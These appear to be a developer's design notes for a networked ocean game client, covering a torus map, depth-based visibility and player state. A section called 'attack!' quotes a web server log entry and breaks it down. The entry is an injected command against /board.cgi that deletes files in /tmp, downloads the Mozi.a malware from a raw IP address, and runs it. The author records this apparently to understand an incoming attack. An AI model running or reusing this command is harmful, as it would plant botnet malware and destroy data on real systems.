# mocean Client

- accommodating different latencies
- join / quit
- torus let's say is 800 by 600 = torx, tory
- visibility circles will be a drag at the boundaries... unless -1 indices save the day
- depth: Let's say the photic zone has 0 at the surface, visibility = vrad = 32
    - 0 1 2 3 4 5 6 7 8 etc        32 28 24 20 16 12 8 4 1 = self only
- grid has a float version and an integer version that "lives" at 0.5, 0.5
- player state
    - x, y as float, modula torx, tory; quantized to tori, torj
    - depth (int)
    - name
    - energy
    - 
- lottery circles
    - centers (lc_torx, lc_tory) and radii lc_torr



## attack!

```
"GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://182.59.105.211:56191/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 870
```

```
HTTP GET 
Paylod: /board.cgi? and tries to run:
      cmd = 
          cd /tmp
          rm -rf *
          wget http://182.59.105.211:56191/Mozi.a
          chmod 777 Mozi.a
          /tmp/Mozi.a varcron        (seems to imply /var/cron) 
 HTTP/1.0
 404 means not found; trailing '870' is ? timing ? 
 ```
